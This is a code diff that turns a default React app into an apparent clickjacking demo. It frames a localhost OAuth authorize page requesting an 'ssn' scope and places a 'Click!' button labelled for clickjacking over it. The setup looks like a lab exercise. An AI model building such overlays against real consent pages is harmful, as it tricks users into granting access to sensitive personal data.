@@ -1,26 +1,24 @@
-import React from 'react';
-import logo from './logo.svg';
+import React, { useState, useEffect } from 'react';
 import './App.css';
+import Iframe from 'react-iframe';
 
-function App() {
+const App = () => {
+  const URL = "https://localhost:3002/authorize?response_type=code&scopes=ssn&client_id=FSB&redirect_uri=https%3A%2F%2Flocalhost%3A5000%2Fcallback&state=8ct13nlaacgti4s5";
+    
   return (
     <div className="App">
-      <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.tsx</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
-      </header>
+        <Iframe url={URL}
+            width = "800px"
+            height = "1024px"
+            position = "absolute"
+            className="App-victim-iframe"
+            />            
+
+      <button className="App-clickjack-button">
+          Click!
+      </button>
     </div>
+    
   );
 }
-
 export default App;
